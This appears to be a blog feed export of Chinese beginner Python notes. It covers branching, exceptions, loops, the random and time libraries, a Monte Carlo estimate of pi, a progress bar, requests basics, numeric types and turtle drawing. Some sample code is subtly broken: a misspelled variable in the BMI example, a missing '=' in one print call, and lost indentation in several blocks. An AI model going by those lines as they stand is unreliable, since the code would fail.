title="多分支结构"></a>多分支结构</h3><p>if &lt;条件&gt; :<br>    &lt;语句块1&gt;<br>elif&lt;条件&gt;:<br>    &lt;语句块2&gt;<br>else:<br>    &lt;语句块3&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python">score = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> score &gt;= <span class="hljs-number">90</span>:<br>grade = <span class="hljs-string">&quot;A&quot;</span><br><span class="hljs-keyword">elif</span> score &gt;=<span class="hljs-number">80</span>:<br>grade = <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-keyword">elif</span> score &gt;=<span class="hljs-number">60</span>:<br>grade = <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-keyword">else</span>:<br>grade = <span class="hljs-string">&quot;D&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入成绩属于级别&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(grade))<br></code></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>try:<br>    &lt;语句块1&gt;<br>except:<br>    &lt;语句块2&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">try</span>:<br>num = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>))<br><span class="hljs-built_in">print</span>(num**<span class="hljs-number">2</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入不是整数&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="实例：身体质量指数BMI"><a href="#实例：身体质量指数BMI" class="headerlink" title="实例：身体质量指数BMI"></a>实例：身体质量指数BMI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python">heiifght,weight = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入身高（米）和体重（公斤）[用逗号隔开]：&quot;</span>))<br>bmi = weight/<span class="hljs-built_in">pow</span>(height,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BMI数值为：&#123;:.2f&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bmi))<br><span class="hljs-keyword">if</span> bmi &lt; <span class="hljs-number">18.5</span>:<br>who = <span class="hljs-string">&quot;偏廋&quot;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-number">18.5</span> &lt;= bmi &lt; <span class="hljs-number">25</span>:<br>who = <span class="hljs-string">&quot;正常&quot;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-number">25</span> &lt;= bmi &lt; <span class="hljs-number">30</span>:<br>who = <span class="hljs-string">&quot;偏胖&quot;</span><br><span class="hljs-keyword">else</span>:<br>who = <span class="hljs-string">&quot;肥胖&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BMI指标为:国际&#x27;&#123;0&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(who))<br></code></pre></td></tr></table></figure><h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><h3 id="循环遍历"><a href="#循环遍历" class="headerlink" title="循环遍历"></a>循环遍历</h3><p><strong>结构：</strong><br>for &lt;循环变量&gt; in &lt;遍历结构&gt;:<br>    &lt;语句块&gt;<br><strong>计数循环N次：</strong><br>for i in range(N):<br>    &lt;语句块&gt;<br><strong>字符串遍历循环：</strong><br>for c in s:<br>    &lt;语句块&gt;<br><strong>列表遍历循环：</strong><br>for item in ls:<br>    &lt;语句块&gt;</p><ul><li>ls是一个列表，遍历其每个元素，产生循环</li></ul><h3 id="无限循环（条件循环）"><a href="#无限循环（条件循环）" class="headerlink" title="无限循环（条件循环）"></a>无限循环（条件循环）</h3><p>while &lt;条件&gt;:<br>    &lt;语句块&gt;</p><h3 id="循环控制保留字"><a href="#循环控制保留字" class="headerlink" title="循环控制保留字"></a>循环控制保留字</h3><ul><li>break: 跳出并结束整个循环</li><li>continue: 跳出此次循环</li></ul><h2 id="random库的使用"><a href="#random库的使用" class="headerlink" title="random库的使用"></a>random库的使用</h2><p>random库是使用随机数的Python标准库。<br>使用 import random</p><ul><li>基本随机数函数： seed(),random().</li><li>扩展随机数函数： randint(), getrandbits(), uniform(), randrange(), choice(), shuffle()</li></ul><h3 id="基本随机数函数"><a href="#基本随机数函数" class="headerlink" title="基本随机数函数"></a>基本随机数函数</h3><p>给出种子：<br>random.seed(10)<br>random.random()  产生随机数<br>需要复现随机数就需要使用种子。</p><h3 id="扩展随机数函数"><a href="#扩展随机数函数" class="headerlink" title="扩展随机数函数"></a>扩展随机数函数</h3><ul><li>random.randint()</li><li>random.randrange()<br><img src="/images/suiji1.png"></li><li>random.getrandbits()</li><li>random.uniform()<br><img src="/images/suiji2.png"></li><li>random.choice()</li><li>random.shuffle()<br><img src="/images/suiji3.png"></li></ul><h2 id="实例：圆周率计算"><a href="#实例：圆周率计算" class="headerlink" title="实例：圆周率计算"></a>实例：圆周率计算</h2><p>蒙特卡洛方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> perf_counter<br>DARTS = <span class="hljs-number">1000</span>*<span class="hljs-number">1000</span><br>hits = <span class="hljs-number">0</span><br>start = perf_counter()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,DARTS+<span class="hljs-number">1</span>):<br>x,y = random(),random()<br>dist = <span class="hljs-built_in">pow</span>(x**<span class="hljs-number">2</span>+y**<span class="hljs-number">2</span>,<span class="hljs-number">0.5</span>)<br><span class="hljs-keyword">if</span> dist &lt;= <span class="hljs-number">1.0</span>:<br>hits = hits + <span class="hljs-number">1</span><br>pi = <span class="hljs-number">4</span>*(hits/DARTS)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;圆周率的值是：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(pi))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python基础学习 基本数据类型（二）</title>
    <link href="/blog/2018/08/04/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/blog/2018/08/04/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下python的基本数据类型。</strong><br><img src="/images/fj3.jpg"></p><span id="more"></span><h2 id="字符串类型及操作"><a href="#字符串类型及操作" class="headerlink" title="字符串类型及操作"></a>字符串类型及操作</h2><h3 id="字符串的表示"><a href="#字符串的表示" class="headerlink" title="字符串的表示"></a>字符串的表示</h3><ul><li>由一对单引号或双引号表示，仅表示单行字符串，例如：<br>“string” 或者 ‘string’</li><li>由一对三单引号或三双引号表示，可表示多行字符串，例如：<br>‘’’string1<br> string2’’’<br>或者<br>“””string1<br> string2”””</li><li>使用[]获取字符串中一个或多个字符<br>1.索引： string[-1]<br>2.切片： string[M:N]<br>切片高级操作： string[M:N:K],K表示步长。字符串逆序可以这样操作：[::-1]。</li><li>转义符\：表达特定字符的本意</li></ul><h3 id="字符串操作符"><a href="#字符串操作符" class="headerlink" title="字符串操作符"></a>字符串操作符</h3><p><img src="/images/czf.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">weekStr = <span class="hljs-string">&quot;一二三四五六日&quot;</span><br>weekId = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入星期数字(1-7):&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;星期&quot;</span> + weekStr[weekId-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><ul><li>len(x) :返回字符串X的长度</li><li>str(x) :返回任意类型x对应的字符串形式，与eval函数作用是相对的</li><li>hex(x)或oct(x) :整数x的十六进制或八进制小写形式字符串</li><li>chr(u) :u为Unicode编码，返回其对应的字符</li><li>ord(x) :x为字符，返回其对应的Unicode编码</li></ul><h3 id="字符串的处理方法"><a href="#字符串的处理方法" class="headerlink" title="字符串的处理方法"></a>字符串的处理方法</h3><p><strong>“方法”：特指<a>.<b>()风格中的函数<b>()</strong><br>八个字符串常用处理方法:<br><img src="/images/fangfa1.png"></p><ul><li>str.replace(old,new):返回字符串str的副本，所有old字串被替换成new</li><li>str.center(width,[fillchar]):字符串str根据宽度width居中，fillchar可选，是填充字符</li></ul><p><img src="/images/fangfa2.png"></p><h3 id="字符串类型格式化"><a href="#字符串类型格式化" class="headerlink" title="字符串类型格式化"></a>字符串类型格式化</h3><p>槽：例如：”{}:计算机{}的CPU占用率为{}%”.format(“2018-8-4”,”A”,10)”     其中大括号包含的即为槽。<br>槽的内部格式化：<br><img src="/images/caogeshihua.png"></p><h2 id="time库的使用"><a href="#time库的使用" class="headerlink" title="time库的使用"></a>time库的使用</h2><h3 id="time库介绍"><a href="#time库介绍" class="headerlink" title="time库介绍"></a>time库介绍</h3><p>time库是Python中处理时间的标准库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br>time.&lt;b&gt;()<br></code></pre></td></tr></table></figure><p>time库包括三类函数：</p><ul><li>时间获取：time() ctime() gmtime()</li><li>时间格式化： strftime() strptime()</li><li>程序计时：sleep()  perf_counter()</li></ul><h3 id="时间获取"><a href="#时间获取" class="headerlink" title="时间获取"></a>时间获取</h3><p>time.time()获取当前时间戳，浮点数<br>time.ctime()获取当前时间，人类易读<br>time.gmtime()获得一个结构体计算机可以利用的时间格式</p><h3 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h3><p><strong>strftime()：</strong><br><img src="/images/time1.png"><br><strong>strptime()：</strong><br><img src="/images/time2.png"></p><h3 id="计时应用"><a href="#计时应用" class="headerlink" title="计时应用"></a>计时应用</h3><p><strong>perf_counter()：</strong><br><img src="/images/time3.png"><br><strong>sleep函数和C语言一致</strong></p><h2 id="实例：文本进度条"><a href="#实例：文本进度条" class="headerlink" title="实例：文本进度条"></a>实例：文本进度条</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br>scale = <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------start-------&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(scale+<span class="hljs-number">1</span>):<br>a = <span class="hljs-string">&#x27;*&#x27;</span> * i<br>b = <span class="hljs-string">&#x27;.&#x27;</span> * (scale - i)<br>c = (i/scale)*<span class="hljs-number">100</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&quot;</span>.<span class="hljs-built_in">format</span>(c,a,b))<br>time.sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------end--------&quot;</span>)<br></code></pre></td></tr></table></figure><p>执行结果：<br><img src="/images/jindutiao.png"></p><p><strong>单行动态刷新：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&#123;:3&#125;%&quot;</span>.<span class="hljs-built_in">format</span>(i),end<span class="hljs-string">&quot;&quot;</span>)<br>time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><p><strong>文本进度条完整效果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br>scale = <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start&quot;</span>.center(scale//<span class="hljs-number">2</span>,<span class="hljs-string">&quot;-&quot;</span>))<br>start = time.perf_counter()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(scale+<span class="hljs-number">1</span>):<br>a = <span class="hljs-string">&#x27;*&#x27;</span> * i<br>b = <span class="hljs-string">&#x27;.&#x27;</span> * (scale - i)<br>c = (i/scale)*<span class="hljs-number">100</span><br>dur = time.perf_counter() - start<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&#123;:.2f&#125;s&quot;</span>.<span class="hljs-built_in">format</span>(c,a,b,dur),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>time.sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;end&quot;</span>.center(scale//<span class="hljs-number">2</span>,<span class="hljs-string">&quot;-&quot;</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中Requests库的基本使用</title>
    <link href="/blog/2018/08/03/Python%E4%B8%ADRequests%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2018/08/03/Python%E4%B8%ADRequests%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>python爬虫从入门到放弃</strong><br><img src="/images/fj2.jpg"></p><span id="more"></span><h2 id="什么是Requests库"><a href="#什么是Requests库" class="headerlink" title="什么是Requests库"></a>什么是Requests库</h2><ul><li>Requests是用python语言基于urllib编写的，采用的是Apache2 Licensed开源协议的HTTP库</li><li>其实urllib还是非常不方便的，而Requests它会比urllib更加方便，可以节约我们大量的工作。（用了requests之后，你基本都不愿意用urllib了）一句话，requests是python实现的最简单易用的HTTP库，建议爬虫使用requests库。</li><li>默认安装好python之后，是没有安装requests模块的，需要单独通过pip安装</li></ul><h2 id="Requests功能"><a href="#Requests功能" class="headerlink" title="Requests功能"></a>Requests功能</h2><h3 id="1-总体功能"><a href="#1-总体功能" class="headerlink" title="1.总体功能"></a>1.总体功能</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>response  = requests.get(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response))<br><span class="hljs-built_in">print</span>(response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response.text))<br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-built_in">print</span>(response.cookies)<br><span class="hljs-built_in">print</span>(response.content)<br><span class="hljs-built_in">print</span>(response.content.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><p><strong>response使用起来确实非常方便，这里有个问题需要注意一下：</strong></p><ul><li>很多情况下的网站如果直接response.text会出现乱码的问题，所以这个使用response.content，这样返回的数据格式其实是二进制格式，然后通过decode()转换为utf-8，这样就解决了通过response.text直接返回显示乱码的问题。</li><li>请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 response.text 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用response.encoding 属性来改变它.如：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">response =requests.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br>response.encoding=<span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>不管是通过**response.content.decode(“utf-8”)<strong>的方式还是通过</strong>response.encoding&#x3D;”utf-8”**的方式都可以避免乱码的问题发生。</li></ul><h3 id="2-各种请求方式"><a href="#2-各种请求方式" class="headerlink" title="2.各种请求方式"></a>2.各种请求方式</h3><ul><li>基本GET请求<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>response = requests.get(<span class="hljs-string">&#x27;https://doubler.cn/get&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li><li>含参数的GET请求<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>response = requests.get(<span class="hljs-string">&quot;https://doubler.cn/get?name=zhujialei&amp;age=20&quot;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li><li>解析json<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br>response = requests.get(<span class="hljs-string">&quot;http://httpbin.org/get&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response.text))<br><span class="hljs-built_in">print</span>(response.json())<br><span class="hljs-built_in">print</span>(json.loads(response.text))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response.json()))<br></code></pre></td></tr></table></figure></li><li>添加headers<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span><br>&#125;<br>response =requests.get(<span class="hljs-string">&quot;https://www.zhihu.com&quot;</span>,headers=headers)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li><li>基本POST请求<br>通过在发送post请求时添加一个data参数，这个data参数可以通过字典构造成，这样对于发送post请求就非常方便:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhujialei&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">20</span><br>&#125;<br>response = requests.post(<span class="hljs-string">&quot;https://doubler.cn/post&quot;</span>,data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python基础学习 基本数据类型</title>
    <link href="/blog/2018/08/03/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/blog/2018/08/03/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下python，了解一下python的基本数据类型。</strong><br><img src="/images/fengjing1.jpg"></p><span id="more"></span><h2 id="数字类型及操作"><a href="#数字类型及操作" class="headerlink" title="数字类型及操作"></a>数字类型及操作</h2><h3 id="1-整数类型"><a href="#1-整数类型" class="headerlink" title="1.整数类型"></a>1.整数类型</h3><ul><li>Python中的整数类型与数学中整数概念一致，可正可负，没有取值范围的限制。下面介绍一下**pow(x,y)**函数：同C语言一致，计算x的y次方，想算多大就算多大。</li><li>四种进制表示：十进制；二进制：以0b开头；八进制：以0o开头；十六进制：以0x开头。</li></ul><h3 id="2-浮点类型"><a href="#2-浮点类型" class="headerlink" title="2.浮点类型"></a>2.浮点类型</h3><ul><li>Python中的浮点类型与数学中实数概念一致，是指带有小数点及小数的数字，它的取值范围和小数精度都存在限制，但是常规计算可以忽略。浮点数间运算存在不确定尾数，这并不是bug。</li><li>由于浮点数间运算存在不确定尾数（不确定尾数通常出现在10的-16次方），可用<strong>round(x,d)</strong>:对x四舍五入，d是小数截取位数。</li><li>科学记数法：<a>e<b> 表示a乘以10的b次方。</li></ul><h3 id="3-复数类型"><a href="#3-复数类型" class="headerlink" title="3.复数类型"></a>3.复数类型</h3><ul><li>实例：z&#x3D;1.23e-4+5.6e+89j<br>实部： z.real<br>虚部： z.imag<br>常规计算很少使用，但到了复变函数那里会经常使用。</li></ul><h3 id="4-数值运算操作符"><a href="#4-数值运算操作符" class="headerlink" title="4.数值运算操作符"></a>4.数值运算操作符</h3><ul><li>x%y：取余运算</li><li>x**y：x的y次方</li><li>如下图：<br><img src="/images/yunsuanfu.png"></li><li>二元操作符：<br><img src="/images/eryuancaozuofu.png"></li></ul><h3 id="5-数值运算函数"><a href="#5-数值运算函数" class="headerlink" title="5.数值运算函数"></a>5.数值运算函数</h3><ul><li>绝对值，商余，幂余：<br><img src="/images/szys.png"></li><li>类型转换<br><img src="/images/lxzh.png"></li></ul><h2 id="实例：天天向上的力量"><a href="#实例：天天向上的力量" class="headerlink" title="实例：天天向上的力量"></a>实例：天天向上的力量</h2><h3 id="持续的价值"><a href="#持续的价值" class="headerlink" title="持续的价值"></a>持续的价值</h3><ul><li>一年365天，每天进步1%，累计可以进步多少呢？<br>pow(1.01,365)&#x3D;37.78343433288728;</li><li>一年365天，每天退步1%，累计可以剩下多少呢？<br>pow(0.99,365)&#x3D;0.025517964452291125；</li></ul><p><strong>每天努力一点点，一年之后将会有很大的不同！相反，每天退步一点点，一年之后便所剩无几。</strong></p><h3 id="利用Python代码实现计算工作日努力参数"><a href="#利用Python代码实现计算工作日努力参数" class="headerlink" title="利用Python代码实现计算工作日努力参数"></a>利用Python代码实现计算工作日努力参数</h3><p><code>Python def dayUp(df):     dayup = 1     for i in range(365):         if i % 7 in [6,0]:             dayup=dayup*(1-0.01)         else:             dayup=dayup*(1+df)     return dayup dayfactor = 0.01 while dayUp(dayfactor) &lt; 37.78:     dayfactor += 0.001 print(&quot;工作日的努力参数是:&#123;:.3f&#125;&quot;.format(dayfactor))</code></p><p>最后得出工作日的努力参数是:0.019（相比于每天多努力0.01的人来说）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>认识了一下python的基础数据类型</li><li>意识到了每天进步一点点的重要性</li><li>以后坚持每天进步一点点</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python绘图</title>
    <link href="/blog/2018/08/01/python%E7%BB%98%E5%9B%BE/"/>
    <url>/blog/2018/08/01/python%E7%BB%98%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>今天看mooc上面的python教程，老师讲了一个有趣的实例，记录一下，挺好玩</strong><br><img src="/images/py.jpg"></p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><strong>安装所需要的turtle库</strong></p><pre><code class="hljs">pip install turtle</code></pre><h2 id="开始编写"><a href="#开始编写" class="headerlink" title="开始编写"></a>开始编写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> turtle<br>turtle.setup(<span class="hljs-number">650</span>,<span class="hljs-number">350</span>,<span class="hljs-number">200</span>,<span class="hljs-number">200</span>)<br>turtle.penup()<br>turtle.fd(-<span class="hljs-number">250</span>)<br>turtle.pendown()<br>turtle.pensize(<span class="hljs-number">25</span>)<br>turtle.pencolor(<span class="hljs-string">&quot;yellow&quot;</span>)<br>turtle.seth(-<span class="hljs-number">40</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    turtle.circle(<span class="hljs-number">40</span>,<span class="hljs-number">80</span>)<br>    turtle.circle(-<span class="hljs-number">40</span>,<span class="hljs-number">80</span>)<br>turtle.circle(<span class="hljs-number">40</span>,<span class="hljs-number">80</span>/<span class="hljs-number">2</span>)<br>turtle.fd(<span class="hljs-number">40</span>)<br>turtle.circle(<span class="hljs-number">16</span>,<span class="hljs-number">180</span>)<br>turtle.fd(<span class="hljs-number">40</span>*<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)<br>turtle.done()<br></code></pre></td></tr></table></figure><p><strong>保存并执行，便会画出一条蛇，还是动态的过程呢。以后还可以画朵玫瑰送给女朋友（虽然还没有哈哈哈），挺不错的呢~</strong><br><img src="/images/PythonDraw.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见图片格式分析总结</title>
    <link href="/blog/2018/07/31/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2018/07/31/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
    
